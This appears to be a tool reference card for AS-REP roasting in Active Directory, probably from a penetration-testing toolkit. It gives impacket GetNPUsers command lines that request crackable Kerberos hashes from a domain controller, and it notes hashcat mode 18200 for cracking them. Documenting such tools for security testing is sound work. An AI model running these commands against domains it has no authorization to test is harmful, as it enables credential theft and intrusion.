# asreproast

**Category**: Active Directory, Kerberos, LDAP, and SMB enumeration

**Purpose**: Find AS-REP roastable users and request crackable Kerberos material.

**When to use**: Use when a Windows domain, SMB, LDAP, Kerberos, domain credentials, or internal Windows hosts are discovered.

## Commands
- `asreproast`
- `impacket-GetNPUsers`
- `GetNPUsers.py`

## First Commands
- `asreproast DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.hashes`
- `impacket-GetNPUsers DOMAIN/USER:PASS -dc-ip DC_IP -request -format hashcat`

## Notes
Crack returned hashes with hashcat mode 18200.

## Captured Help
No live help output was captured. Start with the commands above, or run the tool with `-h`/`--help` in the sandbox.
